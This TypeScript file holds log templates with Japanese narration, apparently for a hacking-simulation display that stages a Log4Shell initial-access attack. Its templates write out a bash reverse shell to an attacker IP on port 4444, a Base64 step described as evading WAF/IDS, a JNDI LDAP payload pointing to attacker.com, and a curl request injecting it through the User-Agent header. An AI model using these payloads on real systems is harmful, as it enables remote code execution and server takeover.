import type { LogTemplate } from "./types";

export const phase3Templates: LogTemplate[] = [
  {
    log: "[INFO] Starting Phase 3: Initial Access...",
    msg: "フェーズ3：初期潜入を開始。\n攻撃基盤の準備を行っています。",
    task: "ACCESS INITIATION",
  },
  {
    log: "[INFO] Determining localhost public IP address...",
    msg: "ローカルサーバーのパブリックIPを取得中。",
    task: "LOCAL SETUP",
  },
  {
    log: "LOCALHOST IP: {ATTACKER_IP}",
    msg: "ローカルサーバーのIPを特定。\n接続待機ポートを4444にセット。",
    task: "LOCAL SETUP",
  },
  {
    log: "Generating reverse shell command...",
    msg: "ターゲット上で実行させる通信確立用コマンドを生成中。",
    task: "CMD GENERATION",
  },
  {
    log: "RAW CMD: bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1",
    msg: "ターゲットのBash入出力をローカルサーバーと接続し、操作権を移譲するコードを構築。",
    task: "CMD GENERATION",
  },
  {
    log: "[INFO] Encoding command to Base64 for WAF/IDS bypass...",
    msg: "セキュリティ製品の検知を回避するため、コマンドをBase64でエンコード中。",
    task: "PAYLOAD ENCODING",
  },
  {
    log: "B64 ENCODED: {B64_CMD}",
    msg: "エンコード完了。\nBase64シリアライズされたペイロードを構築。",
    task: "PAYLOAD ENCODING",
  },
  {
    log: "Constructing final JNDI injection payload...",
    msg: "JNDIプロトコルに適合する最終的な攻撃パケットを構成中。",
    task: "PAYLOAD FINAL",
  },
  {
    log: "PAYLOAD: ${jndi:ldap://attacker.com:1389/Basic/Command/Base64/{B64_CMD}}",
    msg: "Log4Shell用ペイロードが完成。\nターゲットへ送信する準備が整いました。",
    task: "PAYLOAD FINAL",
  },
  {
    log: "curl -i -X POST -H 'User-Agent: ${jndi:ldap://attacker.com:1389/Basic/Command/Base64/{B64_CMD}}' http://{IP}:8080/\nHTTP/1.1 200 OK\nServer: Apache-Coyote/1.1\nContent-Length: 0\nDate: Mon, 23 Feb 2026 10:24:12 GMT\nConnection: close",
    msg: "ターゲットの8080ポートへHTTP POSTリクエストを送信中。",
    task: "EXPLOIT EXECUTION",
  },
  {
    log: "[INFO] Payload sent. Monitoring LDAP and HTTP listeners...",
    msg: "ペイロード送出完了。\nインバウンド・コールバック待機中...",
    task: "EXPLOIT MONITORING",
  },
  {
    log: "[INFO] Incoming LDAP request from {IP}:54210 for /Basic/Command/Base64/...",
    msg: "ターゲットからのLDAP疎通を確認。\nJNDIリファレンス・ポインタを解決。",
    task: "LDAP INTERCEPT",
  },
  {
    log: "[INFO] Sending JNDI Reference pointing to http://{ATTACKER_IP}:8888/Exploit.class",
    msg: "JNDI応答送信。\n攻撃コード（Exploit.class）へのリダイレクトを強制。",
    task: "LDAP INTERCEPT",
  },
  {
    log: "[INFO] HTTP GET request for /Exploit.class received from {IP}",
    msg: "ターゲットによるクラスファイルへのアクセスを検知。\n最終ペイロードを転送中。",
    task: "PAYLOAD DELIVERY",
  },
  {
    log: "[INFO] Exploit.class delivered successfully. Triggering Remote Code Execution...",
    msg: "配信完了。RCEトリガー発動。\nリモートプロセスの制御権を奪取中。",
    task: "PAYLOAD DELIVERY",
  },
  {
    log: "{WAIT_SEARCH}",
    msg: "ポート4444にてリスナー待機中。\nリバースシェルの確立を待っています。",
    task: "SHELL LISTENER",
  },
  {
    log: "[+] Connection received from {IP}:49210",
    msg: "接続確立。\nターゲットサーバー内のプロセス制御権を獲得しました。",
    task: "CONNECTION ESTABLISHED",
  },
  {
    log: "www-data@target-server:/$ whoami",
    msg: "侵入後のカレントユーザーを確認中。",
    task: "PRIVILEGE CHECK",
  },
  {
    log: "www-data",
    msg: "ユーザー「www-data」として潜入成功。\n低権限シェルを確立しました。",
    task: "PRIVILEGE CHECK",
  },
  {
    log: "[SUCCESS] Phase 3: Initial Access successful. Connection stabilized.",
    msg: "フェーズ3：初期潜入に成功。\n内部ネットワークへの足がかりを確保。",
    task: "ACCESS SUCCESS",
  },
];
